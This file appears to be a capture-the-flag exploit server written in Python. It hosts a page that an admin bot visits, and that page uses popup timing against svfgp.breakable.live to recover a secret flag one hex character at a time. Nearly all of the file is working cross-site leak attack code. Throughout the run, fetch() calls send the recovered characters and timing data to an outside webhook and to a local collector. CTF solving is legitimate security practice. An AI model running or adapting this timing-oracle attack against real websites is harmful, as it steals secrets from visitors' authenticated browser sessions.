#!/usr/bin/env python3
"""
SVFGP exploit v8: SHA256 hex-only charset (0-9a-f).
Only 16 chars to test per position = ~3s per char = ~15 chars per bot visit.
"""

import http.server
import json
import sys
import os
import time
import threading

HOST = "0.0.0.0"
PORT = 8888

PIPEDREAM_HOOK = os.environ.get("HOOK", "")
KNOWN_PREFIX = os.environ.get("PREFIX", "CTF{1390e7327d4c2069a97")

results = []
lock = threading.Lock()


def get_exploit_html():
    return """<!DOCTYPE html>
<html><head><title>x</title></head>
<body><pre id="log"></pre>
<script>
const CHALLENGE = "https://svfgp.breakable.live";
const HOOK = """ + json.dumps(PIPEDREAM_HOOK) + """;
const LOCAL = location.origin;
// SHA256 = only hex chars. Check } at end when we have 64 hex chars.
const HEX = "0123456789abcdef";
const PREFIX = """ + json.dumps(KNOWN_PREFIX) + """;
const HASH_LEN = 64; // SHA256 hex length
let cur = PREFIX;

function log(m) { document.getElementById("log").textContent += m + "\\n"; }

function exfil(d) {
    const qs = new URLSearchParams({d: JSON.stringify(d)}).toString();
    fetch(HOOK + "?" + qs, {mode:"no-cors"}).catch(()=>{});
    fetch(LOCAL + "/r?" + qs).catch(()=>{});
}

function probe(candidate) {
    return new Promise((resolve) => {
        const rid = Math.random().toString(36).slice(2, 14);
        const url = CHALLENGE + "/?mode=probe&q=" + encodeURIComponent(candidate) +
                    "&rid=" + rid + "&sid=x";
        const start = performance.now();
        let done = false;

        function handler(ev) {
            if (done) return;
            try {
                if (ev.data && ev.data.type === "svfgp-probe-done" && ev.data.rid === rid) {
                    done = true;
                    window.removeEventListener("message", handler);
                    try { w.close(); } catch(e) {}
                    resolve(performance.now() - start);
                }
            } catch(e) {}
        }
        window.addEventListener("message", handler);
        const w = window.open(url, "_blank");

        if (!w) {
            done = true;
            window.removeEventListener("message", handler);
            exfil({s:"popup_blocked"});
            resolve(-1);
            return;
        }
        setTimeout(() => {
            if (!done) {
                done = true;
                window.removeEventListener("message", handler);
                try { w.close(); } catch(e) {}
                resolve(20000);
            }
        }, 20000);
    });
}

async function solve() {
    exfil({s:"start", p:cur});

    // Quick calibration
    const cal = [];
    for (const w of ["ZZZZ_NO", "QQQQ_NO"]) {
        const t = await probe(w);
        cal.push(t);
    }
    const base = cal.reduce((a,b)=>a+b,0) / cal.length;
    exfil({s:"cal", b:Math.round(base)});

    // Verify prefix
    const vt = await probe(cur);
    exfil({s:"verify", p:cur, t:Math.round(vt), b:Math.round(base), ok:vt>base*2});

    const deadline = Date.now() + 54000;

    while (Date.now() < deadline) {
        const hashSoFar = cur.slice(4); // Remove "CTF{"
        const remaining = HASH_LEN - hashSoFar.length;
        log("pos " + hashSoFar.length + "/" + HASH_LEN + " (" + remaining + " left)");

        if (remaining <= 0) {
            // We have all 64 hex chars, try closing brace
            const t = await probe(cur + "}");
            exfil({s:"closing", p:cur, t:Math.round(t), b:Math.round(base)});
            if (t > base * 2) {
                cur += "}";
                exfil({s:"flag", f:cur});
                log("FLAG: " + cur);
                return;
            }
            break;
        }

        // Scan all 16 hex chars
        const results = [];
        for (let i = 0; i < HEX.length; i++) {
            if (Date.now() > deadline) break;
            const ch = HEX[i];
            const t = await probe(cur + ch);
            results.push({c:ch, t:Math.round(t)});
            log("  " + ch + " " + Math.round(t));
        }

        // Send all timings
        exfil({s:"scan", p:cur, r:results});

        // Find best
        results.sort((a,b) => b.t - a.t);
        const best = results[0];
        const median = results[Math.floor(results.length/2)].t;

        exfil({s:"pick", p:cur, best:best, median:median, ratio:(best.t/median).toFixed(1)});

        if (best.t > median * 2 && best.t > base * 1.8) {
            cur += best.c;
            log("=> " + best.c + " (" + cur + ")");
            exfil({s:"char", p:cur});
        } else {
            exfil({s:"unclear", p:cur, best:best, ratio:(best.t/median).toFixed(1)});
            break;
        }
    }
    exfil({s:"done", p:cur});
}

solve();
</script>
</body></html>"""


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = __import__('urllib.parse', fromlist=['urlparse']).urlparse(self.path)

        if parsed.path == "/r":
            params = __import__('urllib.parse', fromlist=['parse_qs']).parse_qs(parsed.query)
            data = params.get("d", [""])[0]
            ts = time.strftime("%H:%M:%S")
            line = f"[{ts}] {data}"
            print(line, flush=True)
            with lock:
                results.append(line)
                try:
                    d = json.loads(data)
                    if d.get("s") in ("char", "flag", "done"):
                        print(f"\n  *** {d.get('s','').upper()}: {d.get('p','') or d.get('f','')} ***\n", flush=True)
                except:
                    pass
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")
            return

        if parsed.path == "/log":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            with lock:
                self.wfile.write("\n".join(results[-50:]).encode())
            return

        # Serve exploit
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(get_exploit_html().encode())

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else PORT
    if not PIPEDREAM_HOOK:
        print("ERROR: Set HOOK env var"); sys.exit(1)
    print(f"v8 SHA256 mode | {HOST}:{port} | prefix={KNOWN_PREFIX} ({len(KNOWN_PREFIX)-4}/64 hex chars)")
    http.server.HTTPServer((HOST, port), Handler).serve_forever()
